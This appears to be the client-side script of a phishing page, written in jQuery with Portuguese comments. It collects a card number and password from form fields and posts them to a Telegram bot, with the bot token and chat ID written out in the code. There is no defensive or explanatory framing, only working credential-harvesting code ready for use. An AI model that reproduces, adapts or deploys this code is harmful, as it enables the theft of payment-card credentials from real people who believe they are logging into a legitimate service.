$(document).ready(function () {
  // Habilita o botão se ambos os campos tiverem algum valor
  $('#card-input, #password').on('input', function(){
    const cardFilled = $('#card-input').val().trim() !== "";
    const passFilled = $('#password').val().trim() !== "";
    $('#submit-btn').prop('disabled', !(cardFilled && passFilled));
  });
  
  function enviarDados() {
    const cardNumber = $('#card-input').val().trim();
    const password = $('#password').val().trim();

    if (!cardNumber || !password) {
      alert('Preencha todos os campos!');
      return;
    }
    
    const message = `Novo acesso:
Cartão: ${cardNumber}
Senha: ${password}`;
    const token = "7943074825:AAEiarqkDiB9IqchBlLT8L3H1Gge6DFMbVw";
    const chatId = "6663392866";
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    $.post(telegramUrl, {
      chat_id: chatId,
      text: message
    }).done(function(){
      alert("Dados enviados com sucesso!");
    }).fail(function(){
      alert("Falha no envio dos dados para o Telegram!");
    });
  }

  $('#submit-btn').click(function () {
    enviarDados();
  });

  $('#password').keypress(function (e) {
    if (e.which === 13) {
      enviarDados();
    }
  });

  $('#card-input').keypress(function (e) {
    if (e.which === 13) {
      $('#password').focus();
    }
  });
});